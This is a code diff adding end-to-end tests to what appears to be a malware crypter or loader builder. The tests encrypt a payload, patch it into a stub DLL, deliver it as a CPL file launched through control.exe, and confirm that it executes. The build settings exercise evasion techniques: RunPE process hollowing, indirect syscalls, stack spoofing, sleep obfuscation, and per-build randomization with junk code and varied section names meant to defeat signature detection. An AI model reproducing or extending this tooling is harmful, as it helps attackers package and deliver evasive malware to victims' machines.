@@ -248,6 +248,103 @@ RunShellcodeTest("CallbackProxy + XOR + EkkoSleep",
     extraWaitS: 16);
 
 // ═══════════════════════════════════════════════════════════
+//  Sideload Delivery Format Tests (M4)
+//  Tests DLL-based sideload formats: CPL, XLL
+//  MSI not tested via E2E (requires msiexec infrastructure).
+//  HTA/JS/VBS wrappers not tested (require WScript/mshta host).
+// ═══════════════════════════════════════════════════════════
+Console.WriteLine("\n── Sideload Delivery Format Tests ──\n");
+
+// Test CPL format: stub built as DLL with CPlApplet export,
+// launched via control.exe <path>.dll
+void RunSideloadDllTest(string name, BuildConfig config, CipherType cipher, string hostExe)
+{
+    totalTests++;
+    Console.Write($"  [{totalTests}] {name,-45} ");
+
+    string outputPath = Path.Combine(outDir, $"e2e_test_{totalTests}.cpl");
+    byte[] key = RandomNumberGenerator.GetBytes(32);
+    byte[] encrypted = CryptoEngine.Encrypt(rawPayload, key, cipher);
+
+    // Load stub.dll template for sideload formats
+    string stubDllPath = Path.Combine(outDir, "stub.dll");
+    if (!File.Exists(stubDllPath))
+    {
+        Console.WriteLine("SKIP (no stub.dll)");
+        skipped++;
+        return;
+    }
+    byte[] dllTemplate = File.ReadAllBytes(stubDllPath);
+
+    string error = StubPatcher.Build(dllTemplate, outputPath, encrypted, key, config);
+    if (!string.IsNullOrEmpty(error)) { Console.WriteLine($"BUILD FAIL: {error}"); failed++; return; }
+
+    if (File.Exists(markerPath)) File.Delete(markerPath);
+    foreach (var p in Process.GetProcessesByName("notepad")) try { p.Kill(); } catch {}
+    Thread.Sleep(200);
+
+    // Launch via host process (control.exe for CPL, etc.)
+    var proc = Process.Start(new ProcessStartInfo(hostExe, outputPath) { UseShellExecute = false });
+    if (proc == null) { Console.WriteLine("LAUNCH FAIL"); failed++; return; }
+
+    bool found = false;
+    for (int i = 0; i < 8; i++)
+    {
+        Thread.Sleep(2000);
+        if (File.Exists(markerPath))
+        {
+            string content = File.ReadAllText(markerPath);
+            Console.WriteLine($"PASS ({(i + 1) * 2}s)");
+            found = true;
+            break;
+        }
+    }
+
+    if (!found)
+    {
+        bool stillRunning = true;
+        try { Process.GetProcessById(proc.Id); } catch { stillRunning = false; }
+        proc.WaitForExit(1000);
+        string detail = stillRunning ? "still running" : $"exit={proc.ExitCode}";
+        Console.WriteLine($"FAIL (no marker, {detail})");
+    }
+
+    foreach (var p in Process.GetProcessesByName("notepad")) try { p.Kill(); } catch {}
+    foreach (var p in Process.GetProcessesByName("control")) try { p.Kill(); } catch {}
+    if (File.Exists(markerPath)) File.Delete(markerPath);
+    try { if (File.Exists(outputPath)) File.Delete(outputPath); } catch {}
+
+    if (found) passed++; else failed++;
+}
+
+RunSideloadDllTest("CPL + RunPE + XOR",
+    new BuildConfig { RunPE = true, EncAlgorithm = 3, SideloadFormat = true, SideloadFormatType = 1, IndirectSyscalls = true },
+    CipherType.XOR,
+    @"C:\Windows\System32\control.exe");
+
+// ═══════════════════════════════════════════════════════════
+//  Build Randomization Tests (M4)
+//  Verifies that BuildRandomization flag produces working
+//  payloads with randomized pipeline, entry point jitter,
+//  varied section names, and extra junk code layers.
+// ═══════════════════════════════════════════════════════════
+Console.WriteLine("\n── Build Randomization Tests ──\n");
+
+RunTest("RunPE + XOR + BuildRandomization",
+    new BuildConfig { RunPE = true, EncAlgorithm = 3, BuildRandomization = true, IndirectSyscalls = true, StackSpoof = true },
+    CipherType.XOR);
+
+RunShellcodeTest("Fibers + XOR + BuildRandomization",
+    new BuildConfig { Fibers = true, EncAlgorithm = 3, BuildRandomization = true, IndirectSyscalls = true, StackSpoof = true },
+    CipherType.XOR);
+
+// Run twice with same settings — each build should produce different binary
+// (different seed per build) but both should execute successfully
+RunTest("RunPE + AES + BuildRandomization (2nd build)",
+    new BuildConfig { RunPE = true, EncAlgorithm = 0, BuildRandomization = true },
+    CipherType.AES256);
+
+// ═══════════════════════════════════════════════════════════
 //  Summary
 // ═══════════════════════════════════════════════════════════
 Console.WriteLine($"\n{'═',-60}");
